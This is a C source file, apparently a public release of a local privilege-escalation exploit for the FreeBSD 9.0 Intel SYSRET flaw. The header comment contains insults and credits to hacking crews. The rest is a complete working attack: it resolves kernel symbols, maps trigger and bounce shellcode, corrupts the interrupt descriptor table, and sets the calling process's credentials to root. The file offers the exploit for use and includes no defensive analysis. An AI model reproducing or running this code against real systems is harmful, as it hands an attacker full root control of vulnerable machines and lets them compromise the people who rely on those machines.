/*
 * FreeBSD 9.0 Intel SYSRET Kernel Privilege Escalation exploit
 * Author by CurcolHekerLink
 * 
 * This exploit based on open source project, I can make it open source too. Right?
 * 
 * If you blaming me for open sourcing this exploit, you can fuck your mom. Free of charge :)
 *
 * Credits to KEPEDEAN Corp, Barisan Sakit Hati, ora iso sepaying meneh hekerlink,
 * Kismin perogeremer cyber team, petboylittledick, 1337 Curhat Crew and others at #MamaDedehEliteCurhatTeam
 * if you would like next private exploit leakage, just mention @MamahhDedeh
 *
 * Some people may feel harmed when we release this exploit :))
 *
 * p.s: Met idul Adha ya besok, saatnya potong leher dewa lo... eh maksudnya potong Sapisisasi :))
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <machine/cpufunc.h>
#define _WANT_UCRED
#include <sys/proc.h>
#include <machine/segments.h>
#include <sys/param.h>
#include <sys/linker.h>
#define TRIGGERSIZE 20
#define BOUNCESIZE 18

uintptr_t Xdivp, Xdbgp, Xbptp, Xoflp, Xbndp, Xillp, Xdnap, Xfpusegmp, Xtssp, Xmissingp, Xstkp, Xprotp, Xpagep, Xfpup, Xalignp, Xmchkp, Xxmmp;

struct gate_descriptor * sidt()
{
	struct region_descriptor idt;
	asm ("sidt %0": "=m"(idt));
	return (struct gate_descriptor*)idt.rd_base;
}

u_long matchsym(char *symname)
{
	struct kld_sym_lookup ksym;
	ksym.version = sizeof (ksym);
	ksym.symname = symname;
	if (kldsym(0, KLDSYM_LOOKUP, &ksym) < 0) {
		perror("kldsym");
		exit(1);
	}
	return ksym.symvalue;
}

void setidt(struct gate_descriptor *idt, int idx, uintptr_t func, int typ, int dpl, int ist)
{
	struct gate_descriptor *ip;
	ip = idt + idx;
	ip->gd_looffset = func;
	ip->gd_selector = GSEL(GCODE_SEL, SEL_KPL);
	ip->gd_ist = ist;
	ip->gd_xx = 0;
	ip->gd_type = typ;
	ip->gd_dpl = dpl;
	ip->gd_p = 1;
	ip->gd_hioffset = func>>16;
}

void payload()
{
	printf("[+] Woohoo!!!\n");
	exit(0);
}

void resetidt()
{
	struct thread *td;
	struct ucred *cred;
	struct gate_descriptor *idt = sidt();
	setidt(idt, IDT_DE, Xdivp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_DB, Xdbgp, SDT_SYSIGT, SEL_KPL, 0);	
	setidt(idt, IDT_BP, Xbptp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_OF, Xoflp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_BR, Xbndp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_UD, Xillp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_NM, Xdnap, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_FPUGP, Xfpusegmp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_TS, Xtssp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_NP, Xmissingp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_SS, Xstkp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_GP, Xprotp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_PF, Xpagep, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_MF, Xfpup, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_AC, Xalignp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_MC, Xmchkp, SDT_SYSIGT, SEL_KPL, 0);
	setidt(idt, IDT_XF, Xxmmp, SDT_SYSIGT, SEL_KPL, 0);
	
	asm ("mov %%gs:0, %0" : "=r"(td));
	
	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	cred->cr_groups[0] = 0;
	
	asm ("swapgs; sysretq;" :: "c"(payload));
}

void resolving()
{
	Xdivp = (uintptr_t)matchsym("Xdiv");
	Xdbgp = (uintptr_t)matchsym("Xdbg");
	Xbptp = (uintptr_t)matchsym("Xbpt");
	Xoflp = (uintptr_t)matchsym("Xofl");
	Xbndp = (uintptr_t)matchsym("Xbnd");
	Xillp = (uintptr_t)matchsym("Xill");
	Xdnap = (uintptr_t)matchsym("Xdna");
	Xfpusegmp = (uintptr_t)matchsym("Xfpusegm");
	Xtssp = (uintptr_t)matchsym("Xtss");
	Xmissingp = (uintptr_t)matchsym("Xmissing");
	Xstkp = (uintptr_t)matchsym("Xstk");
	Xprotp = (uintptr_t)matchsym("Xprot");
	Xpagep = (uintptr_t)matchsym("Xpage");
	Xfpup = (uintptr_t)matchsym("Xfpu");
	Xalignp = (uintptr_t)matchsym("Xalign");
	Xmchkp = (uintptr_t)matchsym("Xmchk");
	Xxmmp = (uintptr_t)matchsym("Xxmm");
}

void trigger()
{
	printf("[+] Crotz...\n");
	uint64_t pagesize = getpagesize();
	uint8_t * mappedarea = (uint8_t*)((1ULL << 47) - pagesize);
	mappedarea = mmap(mappedarea, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);
	if (mappedarea == MAP_FAILED) {
		perror("mmap (trigger)");
		exit(1);
	}

	char triggerpayload[] =
		"\xb8\x18\x00\x00\x00"
		"\x48\x89\xe3"
		"\x48\xbc\xef\xbe\xad\xde\xef\xbe\xad\xde"
		"\x0f\x05";

	uint8_t * offset_addr = mappedarea + pagesize - TRIGGERSIZE;
	memcpy(offset_addr, triggerpayload, TRIGGERSIZE);

	*(uint64_t*)(offset_addr + 10) = (uint64_t)(((uint8_t*)&sidt()[14]) + 10 * 8);
	printf("[+] Crotz...\n");
	char bouncepayload[] =
		"\x0f\x01\xf8"
		"\x48\x89\xdc"
		"\x48\xb8\xef\xbe\xad\xde\xef\xbe\xad\xde"
		"\xff\xe0";

	uint8_t * bouncer = (uint8_t*)(0x900000000 | (Xpagep & 0xFFFFFFFF));
	size_t bouncer_allocsize = pagesize;
	if ((uint8_t*)((uint64_t)bouncer & ~(pagesize-1)) + pagesize < bouncer + BOUNCESIZE)
		bouncer_allocsize += pagesize;
	if (mmap((void*)((uint64_t)bouncer & ~(pagesize-1)), bouncer_allocsize, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0) == MAP_FAILED)
	{
		perror("mmap (bouncer)");
		exit(1);
	}
	memcpy(bouncer, bouncepayload, BOUNCESIZE);
	*(uint64_t*)(bouncer + 8) = (uint64_t)resetidt;
	((void (*)())offset_addr)();
}

int main(int argc, char *argv[])
{
	printf("[+] SYSRET FUCKUP!!\n");
	printf("[+] Start Engine...\n");
	resolving();
	printf("[+] Crotz...\n");
	trigger();
	return 0;
}